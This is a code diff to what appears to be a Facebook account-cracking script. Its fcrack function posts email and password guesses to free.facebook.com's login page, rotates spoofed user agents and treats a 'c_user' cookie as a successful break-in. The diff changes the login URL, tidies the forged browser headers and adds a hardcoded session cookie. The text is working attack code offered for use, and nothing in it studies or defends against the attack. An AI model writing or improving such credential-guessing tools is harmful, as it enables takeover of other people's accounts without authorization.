@@ -149,6 +149,7 @@ awan =[
 'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',
+'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',]
 logo=("""\033[1;97m
    
@@ -825,38 +826,25 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority': 'free.facebook.com', 
+			header_freefb = { 'authority': 'free.facebook.com',
             'method': 'GET',
-
-            'path': '/home.php?',
-
-            'scheme': 'https accept: text/html,application/xhtml+xml,application/xml;q=0.9, image/avit,image/webp,image/apng,*/*;q=0.8, application/signed-exchange: vb3;q=0.9',
-
+            'path': '/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-encoding': 'gzip, deflate, br',
-
-            'accept-language': 'en-US, en q-0.9',
-
-
-            
-
-            'sec-ch-ua': '"Chromium"; v-"107", "Not-A7Brand"; v-"24"',
-
+            'accept-language': 'en-US,en;q=0.9',
+            'cookie': 'sb=nKBSYqRECxyL7RuJr8vc0xu1; datr=nKBSYvrx9hfYlie57qaPOHCi; locale=en_US; m_pixel_ratio=1.25; dpr=1.25; wd=456x486; fr=0hLscfSFT8A5vSA7Q.AWU7Mbg65F1LpIqxpm9DpRZ-Lzs.Bjtru5.df.AAA.0.0.BjuAng.AWUDtvHzWk4',
+            'referer': 'https://free.facebook.com/',
+            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
             'sec-ch-ua-mobile': '?0',
-
-            'sec-ch-ua-platform': '"Linux"',
-
+            'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'document',
-
             'sec-fetch-mode': 'navigate',
-
             'sec-fetch-site': 'same-origin',
-
             'sec-fetch-user': '?1',
-
-            'upgrade-insecure-requests': '1', 
-
+            'upgrade-insecure-requests': '1',
             'user-agent': ua}
-			lo = session.post('https://free.facebook.com/?hrc=1&_rdr',data=log_data,headers=header_freefb).text
+			lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
